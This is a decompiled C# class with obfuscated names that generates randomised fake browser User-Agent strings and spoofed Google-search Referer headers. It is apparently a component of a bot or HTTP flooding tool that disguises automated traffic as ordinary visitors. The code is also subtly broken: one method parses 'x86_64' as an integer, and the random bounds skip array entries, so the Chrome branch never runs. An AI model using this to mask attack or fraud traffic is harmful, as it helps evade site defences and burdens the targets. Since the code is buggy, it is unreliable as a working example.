using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class GEJgnuYlkBFIyYngQxzVxCQ
{
	private static string[] linux_proc = new string[2] { "i686", "x86_64" };

	private static string[] mac_proc = new string[4] { "Intel", "PPC", "U; Intel", "U; PPC" };

	private static string[] langs = new string[3] { "en-US", "de-DE", "en-GB" };

	private static Random rnd = new Random();

	public static string firefox()
	{
		string[] array = new string[4]
		{
			"Gecko/ Firefox/" + Conversions.ToString(rnd.Next(5, 9)) + ".0",
			"Gecko/ Firefox/" + Conversions.ToString(rnd.Next(5, 9)) + ".0.1",
			"Gecko/ Firefox/3.6." + Conversions.ToString(rnd.Next(1, 20)),
			"Gecko/ Firefox/3.8."
		};
		string[] array2 = new string[3]
		{
			"(Windows NT " + Conversions.ToString(rnd.Next(5, 6)) + "." + Conversions.ToString(rnd.Next(0, 1)) + "; " + langs[rnd.Next(0, Information.UBound((Array)langs, 1))] + "; rv 1.9." + Conversions.ToString(rnd.Next(0, 2)) + ".20) " + array[rnd.Next(0, Information.UBound((Array)array, 1))],
			"(X11; Linux " + linux_proc[rnd.Next(0, Information.UBound((Array)linux_proc, 1))] + "; rv:" + Conversions.ToString(rnd.Next(5, 7)) + ".0) " + array[rnd.Next(0, Information.UBound((Array)array, 1))],
			"(Macintosh; " + mac_proc[rnd.Next(0, Information.UBound((Array)mac_proc, 1))] + " Max OS X 10_" + Conversions.ToString(rnd.Next(5, 7)) + "_" + Conversions.ToString(rnd.Next(0, 9)) + " rv:" + Conversions.ToString(rnd.Next(2, 6)) + ".0) " + array[rnd.Next(0, Information.UBound((Array)array, 1))]
		};
		return array2[rnd.Next(0, Information.UBound((Array)array2, 1))];
	}

	public static string safari()
	{
		string text = Conversions.ToString(rnd.Next(531, 535)) + "." + Conversions.ToString(rnd.Next(1, 50)) + "." + Conversions.ToString(rnd.Next(1, 7));
		string text2 = ((rnd.Next(0, 1) != 0) ? (Conversions.ToString(rnd.Next(4, 5)) + ".0." + Conversions.ToString(rnd.Next(1, 5))) : (Conversions.ToString(rnd.Next(4, 5)) + "." + Conversions.ToString(rnd.Next(0, 1))));
		string[] array = new string[3]
		{
			"(Windows; U; Windows NT " + Conversions.ToString(rnd.Next(5, 6)) + "." + Conversions.ToString(rnd.Next(0, 1)) + ") AppleWebKit/" + text + "  (KHTML, like Gecko) Version/" + text2 + " Safari/" + text,
			"(Macintosh; U; " + mac_proc[rnd.Next(0, Information.UBound((Array)mac_proc, 1))] + " Mac OS X 10_" + Conversions.ToString(rnd.Next(5, 7)) + "_" + Conversions.ToString(rnd.Next(0, 9)) + " rv:" + Conversions.ToString(rnd.Next(2, 6)) + ".0; " + langs[rnd.Next(0, Information.UBound((Array)langs, 1))] + ") AppleWebKit/" + text + " (KHTML, like Gecko) Version/" + text2 + " Safari/" + text,
			"(iPod; U; CPU iPhone OS " + Conversions.ToString(rnd.Next(3, 4)) + "_" + Conversions.ToString(rnd.Next(0, 3)) + " like Mac OS X; " + langs[rnd.Next(0, Information.UBound((Array)langs, 1))] + ") AppleWebKit/" + text + " (KHTML, like Gecko) Version/" + Conversions.ToString(rnd.Next(0, 4)) + ".0.5 Mobile/8B" + Conversions.ToString(rnd.Next(111, 119)) + " Safari/" + text
		};
		return array[rnd.Next(0, Information.UBound((Array)array, 1))];
	}

	public static string iexplore()
	{
		string[] array = new string[3]
		{
			"",
			"; .NET CLR 1.1." + Conversions.ToString(rnd.Next(4320, 4325)) + "\"",
			"; WOW64"
		};
		string[] array2 = new string[1] { "(compatible; MSIE " + Conversions.ToString(rnd.Next(5, 9)) + ".0; Windows NT " + Conversions.ToString(rnd.Next(5, 6)) + "" + array[rnd.Next(0, Information.UBound((Array)array, 1))] + ")" };
		return array2[rnd.Next(0, Information.UBound((Array)array2, 1))];
	}

	public static string opera()
	{
		string[] array = new string[3]
		{
			"",
			"; .NET CLR 1.1." + Conversions.ToString(rnd.Next(4320, 4325)) + "\"",
			"; WOW64"
		};
		string[] array2 = new string[2]
		{
			"(X11; Linux " + linux_proc[rnd.Next(0, Information.UBound((Array)linux_proc, 1))] + "; U; " + langs[rnd.Next(0, Information.UBound((Array)langs, 1))] + ") Version/" + Conversions.ToString(rnd.Next(10, 12)) + ".00",
			"(Windows NT " + Conversions.ToString(rnd.Next(5, 6)) + "." + Conversions.ToString(rnd.Next(0, 1)) + "; U; " + langs[rnd.Next(0, Information.UBound((Array)langs, 1))] + ") Version/" + Conversions.ToString(rnd.Next(10, 12)) + ".00"
		};
		return array2[rnd.Next(0, Information.UBound((Array)array2, 1))];
	}

	public static string chrome()
	{
		string text = Conversions.ToString(rnd.Next(531, 536)) + Conversions.ToString(rnd.Next(0, 2));
		string[] array = new string[3]
		{
			"(X11; Linux " + Conversions.ToString(rnd.Next(0, Conversions.ToInteger(linux_proc[Information.UBound((Array)linux_proc, 1)]))) + ") AppleWebKit/" + text + " (KHTML, like Gecko) Chrome/" + Conversions.ToString(rnd.Next(13, 15)) + ".0." + Conversions.ToString(rnd.Next(800, 899)) + ".0 Safari/" + text,
			"(Windows NT " + Conversions.ToString(rnd.Next(5, 6)) + "." + Conversions.ToString(rnd.Next(0, 1)) + ") AppleWebKit/" + text + " (KHTML, like Gecko) Chrome/" + Conversions.ToString(rnd.Next(13, 15)) + ".0." + Conversions.ToString(rnd.Next(800, 899)) + ".0 Safari/" + text,
			"(Macintosh, U; " + mac_proc[rnd.Next(0, Information.UBound((Array)mac_proc, 1))] + " Mac OS X 10_" + Conversions.ToString(rnd.Next(5, 7)) + "_" + Conversions.ToString(rnd.Next(0, 9)) + ") AppleWebKit/" + text + " (KHTML, like Gecko) Chrome/" + Conversions.ToString(rnd.Next(13, 15)) + ".0." + Conversions.ToString(rnd.Next(800, 899)) + ".0 Safari/" + text
		};
		return array[rnd.Next(0, Information.UBound((Array)array, 1))];
	}

	public static string MuJiiJSeHaGdvVvHBTDZJTZ()
	{
		return rnd.Next(0, 4) switch
		{
			0 => "Mozilla/5.0 " + firefox(), 
			1 => "Mozilla/5.0 " + safari(), 
			2 => "Mozilla/" + Conversions.ToString(rnd.Next(4, 5)) + ".0 " + iexplore(), 
			3 => "Opera/" + Conversions.ToString(rnd.Next(8, 9)) + "." + Conversions.ToString(rnd.Next(10, 99)) + " " + opera(), 
			4 => "Mozilla/5.0" + chrome(), 
			_ => "", 
		};
	}

	public static string VhyNVWfDxbdKQjrhNIJHMwE()
	{
		string[] array = new string[13]
		{
			"http://www.google.de/search?sclient=psy&hl=de&site=&source=hp&q=" + randWord() + "bunnies&btnG=Suche",
			"Referer: http://www.google.se/search?sclient=psy&hl=se&site=&source=hp&q=" + randWord() + "&btnG=Sök+på+Google",
			"Referer: http://www.google.co.uk/search?sclient=psy&hl=en&site=&source=hp&q=" + randWord() + "&btnG=Search",
			"Referer: http://www.google.ch/search?sclient=psy&hl=ch&site=&source=hp&q=" + randWord() + "&btnG=Google-Suche",
			"Referer: http://www.google.li/search?sclient=psy&hl=de&site=&source=hp&q=" + randWord() + "&btnG=Suche",
			"Referer: http://www.google.com/search?sclient=psy&hl=en&site=&source=hp&q=" + randWord() + "&btnG=Search",
			"Referer: http://www.google.ch/search?sclient=psy&hl=ch&site=&source=hp&q=" + randWord() + "&btnG=Google-Suche",
			"Referer: http://www.google.be/search?sclient=psy&hl=be&site=&source=hp&q=" + randWord() + "&btnG=Google+zoeken",
			"Referer: http://www.google.de/search?sclient=psy&hl=de&site=&source=hp&q=" + randWord() + "&btnG=Suche",
			"Referer: http://www.google.us/search?sclient=psy&hl=en&site=&source=hp&q=" + randWord() + "&btnG=Search",
			"Referer: http://www.google.de/search?sclient=psy&hl=de&site=&source=hp&q=" + randWord() + "&btnG=Suche",
			"Referer: http://www.google.nl/search?sclient=psy&hl=nl&site=&source=hp&q=" + randWord() + "&btnG=Google+zoeken",
			"Referer: http://www.google.fr/search?sclient=psy&hl=fr&site=&source=hp&q=" + randWord() + "&btnG=Rechercher"
		};
		return array[randInt(0, array.Length)];
	}

	public static string randWord()
	{
		string[] array = new string[9] { "write", "some", "values", "here", "for", "the", "google", "search", "referral" };
		return array[randInt(0, array.Length)];
	}

	public static int randInt(int min, int max)
	{
		Random random = new Random();
		return random.Next(min, max);
	}
}
